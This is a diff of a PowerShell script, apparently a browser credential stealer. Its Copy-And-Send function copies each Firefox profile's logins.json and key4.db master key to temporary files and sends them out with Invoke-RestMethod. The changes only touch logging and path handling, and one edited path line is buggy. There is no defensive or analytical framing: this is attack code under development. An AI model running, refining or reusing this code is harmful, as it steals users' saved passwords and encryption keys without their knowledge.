@@ -22,7 +22,7 @@ function Copy-And-Send {
     # Kopieren der Datenbank und des Masterkeys, um Sperren zu vermeiden
     if (Test-Path $dbPath) {
         Copy-Item $dbPath $tempDb -Force
-        Write-Log "Copied database for $browserName ($profileName): $dbPath"
+        Write-Log "Copied database for $browserName ($profileName): From $dbPath to $tempDb"
     } else {
         Write-Log "Database path not found for $browserName ($profileName): $dbPath"
         return
@@ -30,7 +30,7 @@ function Copy-And-Send {
 
     if (Test-Path $masterKeyPath) {
         Copy-Item $masterKeyPath $tempMasterKey -Force
-        Write-Log "Copied master key for $browserName ($profileName): $masterKeyPath"
+        Write-Log "Copied master key for $browserName ($profileName): From $masterKeyPath to $tempMasterKey"
     } else {
         Write-Log "Master key path not found for $browserName ($profileName): $masterKeyPath"
         return
@@ -54,7 +54,7 @@ function Copy-And-Send {
 
     try {
         Invoke-RestMethod @Parameters
-        Write-Log "Sent data for $browserName ($profileName)"
+        Write-Log "Sent data for $browserName ($profileName): From $tempDb and $tempMasterKey"
     } catch {
         Write-Log "Failed to send data for $browserName ($profileName): $_"
     }
@@ -88,8 +88,8 @@ if (Test-Path $firefoxProfileDir) {
     $profiles = Get-ChildItem -Path $firefoxProfileDir -Directory
     foreach ($profile in $profiles) {
         $profileName = $profile.Name
-        $dbPath = "$profile\logins.json"
-        $masterKeyPath = "$profile\key4.db"
+        $dbPath = "$profile.FullName\logins.json"
+        $masterKeyPath = "$profile.FullName\key4.db"
         Copy-And-Send -browserName "Firefox" -dbPath $dbPath -masterKeyPath $masterKeyPath -profileName $profileName
     }
 } else {
